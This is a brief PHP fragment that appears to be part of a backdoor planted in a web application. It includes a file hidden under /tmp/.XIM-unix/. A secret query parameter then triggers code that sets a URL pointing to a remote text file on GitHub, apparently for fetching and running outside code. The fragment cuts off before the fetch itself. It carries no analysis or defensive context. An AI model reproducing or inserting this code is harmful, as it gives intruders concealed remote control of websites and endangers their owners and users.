...
include("/tmp/.XIM-unix/.ojs_capture");
if (isset($_GET['PengemulLKerangAmis'])) {
    $url = "https://raw.githubusercontent.com/desvaranayla-spec/access-in-links/refs/heads/main/alpa-kerang-syn.txt";
